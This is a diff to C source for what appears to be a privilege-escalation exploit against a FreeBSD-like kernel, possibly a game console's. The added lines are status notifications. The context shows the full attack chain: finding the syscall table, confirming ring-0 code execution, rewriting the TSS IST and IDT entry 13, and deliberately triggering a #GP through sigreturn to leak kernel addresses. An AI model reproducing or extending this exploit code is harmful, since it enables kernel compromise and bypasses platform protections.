@@ -776,10 +776,12 @@ static void campaign_doreti_iret(void) {
     fflush(stdout);
 
     /* ── Step 1: Find and verify sysent ── */
+    notify("[HV2] Step 1: finding sysent...");
     printf("[*] Step 1: Finding sysent table...\n");
     uint64_t sysent_kva = find_sysent();
     if (!sysent_kva) {
         printf("[-] Cannot proceed without sysent.\n");
+        notify("[HV2] FAIL: sysent not found");
         return;
     }
     if (!verify_sysent(sysent_kva)) {
@@ -790,15 +792,18 @@ static void campaign_doreti_iret(void) {
     fflush(stdout);
 
     /* ── Step 2: Test ring-0 execution ── */
+    notify("[HV2] Step 2: testing ring-0...");
     printf("[*] Step 2: Testing ring-0 execution...\n");
     if (test_ring0(sysent_kva) != 0) {
         printf("[-] Ring-0 execution failed. Cannot proceed.\n");
+        notify("[HV2] FAIL: ring-0 test");
         return;
     }
     printf("[+] Ring-0 execution confirmed.\n\n");
     fflush(stdout);
 
     /* ── Step 3: Read IDT and TSS ── */
+    notify("[HV2] Step 3: reading IDT/TSS...");
     printf("[*] Step 3: Reading IDT and TSS...\n");
 
     uint64_t idt_kva = g_kdata_base + KSTUFF_IDT_OFF;
@@ -867,6 +872,7 @@ static void campaign_doreti_iret(void) {
     fflush(stdout);
 
     /* ── Step 4: Allocate IST stack for #GP ── */
+    notify("[HV2] Step 4: allocating IST stack...");
     printf("[*] Step 4: Allocating dedicated #GP IST stack...\n");
 
     /* We need a page of kernel-accessible memory for the IST stack.
@@ -946,6 +952,7 @@ static void campaign_doreti_iret(void) {
     fflush(stdout);
 
     /* ── Step 5: Save originals and configure IST + IDT ── */
+    notify("[HV2] Step 5: configuring TSS/IDT...");
     printf("\n[*] Step 5: Configuring TSS IST%d and IDT[13]...\n", target_ist);
 
     /* Save original IST value */
@@ -1051,6 +1058,7 @@ static void campaign_doreti_iret(void) {
     fflush(stdout);
 
     /* ── Step 7: Set up signal handling ── */
+    notify("[HV2] Step 7: signal handlers...");
     printf("\n[*] Step 7: Setting up signal handlers and alt stack...\n");
 
     /* Allocate a signal stack (sigaltstack) — needed because our normal
@@ -1093,6 +1101,7 @@ static void campaign_doreti_iret(void) {
     fflush(stdout);
 
     /* ── Step 8: Start writer thread ── */
+    notify("[HV2] Step 8: writer thread...");
     printf("\n[*] Step 8: Starting writer thread...\n");
 
     struct writer_ctx wctx;
@@ -1115,6 +1124,7 @@ static void campaign_doreti_iret(void) {
     fflush(stdout);
 
     /* ── Step 9: Trigger #GP with non-canonical sigreturn ── */
+    notify("[HV2] Step 9: TRIGGERING #GP!");
     printf("\n[*] Step 9: Triggering #GP via sigreturn with non-canonical RIP...\n");
     printf("    This will cause a controlled kernel crash that we catch as SIGBUS.\n");
     printf("    The mc_rip in the signal context = doreti_iret address.\n\n");
@@ -1267,15 +1277,20 @@ int main(void) {
     fflush(stdout);
 
     /* Initialize */
+    notify("[HV2] init_fw_offsets...");
     if (init_fw_offsets() != 0) {
         printf("[-] Failed to init FW offsets\n");
+        notify("[HV2] FAIL: init_fw_offsets");
         return 1;
     }
 
+    notify("[HV2] discover_dmap_base...");
     if (discover_dmap_base() != 0) {
         printf("[-] Failed to discover DMAP base — cannot proceed\n");
+        notify("[HV2] FAIL: DMAP discovery");
         return 1;
     }
+    notify("[HV2] DMAP OK, starting campaign...");
 
     /* Run doreti_iret discovery */
     campaign_doreti_iret();
